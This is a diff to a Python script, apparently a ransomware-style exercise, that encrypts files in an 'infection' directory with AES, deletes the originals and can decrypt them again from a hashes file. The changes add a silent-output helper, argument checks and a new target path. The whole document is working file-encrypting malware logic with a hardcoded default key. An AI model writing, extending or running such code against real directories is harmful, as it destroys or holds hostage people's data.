@@ -5,11 +5,14 @@ from Crypto.Cipher import AES
 import sys
 key = b'password42424242'
 silent = 0
-PATH = './infection/'
+PATH = './home/infection/'
 EXTENSIONS = './extensions'
 HASHES_FILE = './file_hashes'
 
 def doDir(directory, flag):
+    if not os.path.exists(PATH):
+        printMessage("Directory " + PATH + " does not exist")
+        exit(1)
     with open(EXTENSIONS, 'r') as extensionsFile:
         allowedExtensions = [extension.strip().lower() for extension in extensionsFile.readlines()]
     pattern = os.path.join(directory, '*')
@@ -21,8 +24,6 @@ def doDir(directory, flag):
             encryptFile(file, allowedExtensions)
         else:
             reverseEncrypt(file)
-    if flag != 0:
-        deleteHashes()
             
 def deleteHashes():
     if os.path.exists(HASHES_FILE):
@@ -43,19 +44,18 @@ def encryptFile(file, EXTENSIONS):
         with open(encryptFilePath, 'wb') as encryptedFile:
             [encryptedFile.write(x) for x in (cipher.nonce, tag, ciphertext)]
         os.remove(file)
-        if silent == 0:
-            print("File", file, "encrypted")
+        printMessage("File " + file + " encrypted")
 
 def reverseEncrypt(file):
     try:
         with open(HASHES_FILE, 'r') as hashes:
             lines = hashes.readlines()
     except:
-        print("ERROR: Hash file not found")
+        printMessage("ERROR: Hash file not found")
         exit(1)
     if not lines:
-        print("No hashs found in", HASHES_FILE)
-        return
+        printMessage("No hashs found in", HASHES_FILE)
+        exit(1)
     for line in lines:
         line = line.strip()
         parts = line.split(':')
@@ -72,17 +72,15 @@ def reverseEncrypt(file):
                         decryptedFile.write(plain)
                     decryptedHash = generateHash(decryptedFileName)
                     if originalHash == decryptedHash:
-                        if silent == 0:
-                            print("File", file, "decrypted successfully.")
+                        printMessage("File " + file + " decrypted successfully.")
                         os.remove(file)
                     else:
-                        print("Failed to decrypt", file)
+                        printMessage("Failed to decrypt " + file)
                     return
                 except ValueError:
-                    print("Failed to decrypt", file)
+                    printMessage("Failed to decrypt " + file)
                     return
-    if silent == 0:
-        print("File", file, "not found in the hashes file.")
+    printMessage("File " + file + " not found in the hashes file.")
 
 def generateHash(file):
     fileEx = os.path.basename(file)
@@ -93,10 +91,14 @@ def generateHash(file):
 def getPassword(inputPass):
     global key
     if len(inputPass) != 16 and len(inputPass) != 24 and len(inputPass) != 32:
-        print("Invalid key length")
+        printMessage("Invalid key length")
         exit(1)
     else:
         key = inputPass.encode()
+
+def printMessage(stringToPrint):
+    if silent == 0:
+        print(stringToPrint)
 
 def help():
     print("Use -help or -h to show this message")
@@ -118,6 +120,7 @@ if __name__ == '__main__':
                 silent = 1
                 if len(sys.argv) < 3:
                     doDir(PATH, 0)
+                    
             if a == "-reverse" or a == "-r":
                 if len(sys.argv) > sys.argv.index(a) + 2:
                     if sys.argv[sys.argv.index(a) + 1] == "-p" or  sys.argv[sys.argv.index(a) + 1] == "-password":
@@ -125,7 +128,18 @@ if __name__ == '__main__':
                 doDir(PATH, 1)
                 exit()
             if a == "-password" or a == "-p":
-                getPassword(sys.argv[sys.argv.index(a) + 1])
-                doDir(PATH, 0)
+                if len(sys.argv) > sys.argv.index(a) + 1:
+                    getPassword(sys.argv[sys.argv.index(a) + 1])
+                else:
+                    print("ERROR: No password added as argument")
+                    exit(1)
+                if len(sys.argv) > sys.argv.index(a) + 2:
+                    if sys.argv[sys.argv.index(a) + 2] == "-r" or  sys.argv[sys.argv.index(a) + 2] == "-reverse":
+                        doDir(PATH, 1)
+                        exit()
+                else:
+                    doDir(PATH, 0)
+                    exit()
     else:
         doDir(PATH, 0)
+        exit()
